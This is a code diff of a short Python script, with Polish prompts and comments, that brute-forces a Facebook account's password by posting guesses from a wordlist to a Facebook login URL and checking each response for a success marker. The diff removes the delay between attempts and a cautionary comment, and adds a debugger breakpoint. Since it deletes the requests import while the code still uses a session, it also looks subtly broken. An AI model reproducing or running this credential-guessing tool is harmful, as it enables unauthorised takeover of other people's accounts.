@@ -1,6 +1,4 @@
-import requests
-import time
-import getpass
+import pdb
 
 def brute_force(username, fb_id, passwords):
     url = f'https://www.facebook.com/{fb_id}'
@@ -10,9 +8,6 @@ def brute_force(username, fb_id, passwords):
             data = {'email': username, 'pass': password}
 
             response = session.post(url, data=data)
-            
-            # Dodaj opóźnienie między próbami
-            time.sleep(1)
 
             if 'Find Friends' in response.text:
                 print(f'Prawidłowe hasło znalezione: {password}')
@@ -23,13 +18,12 @@ def brute_force(username, fb_id, passwords):
 def main():
     email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
     fb_id = input('Podaj identyfikator Facebooka: ')
-    
-    # Uwaga: To jest zalecane do testów. W prawdziwej sytuacji zaleca się odczyt hasła z bezpiecznego źródła.
     password_file = input('Podaj nazwę pliku z hasłami: ')
-    
+
     with open(password_file, 'r') as file:
         passwords = [line.strip() for line in file]
 
+    pdb.set_trace()  # Dodaj to miejsce do debugowania
     brute_force(email, fb_id, passwords)
 
 if __name__ == '__main__':
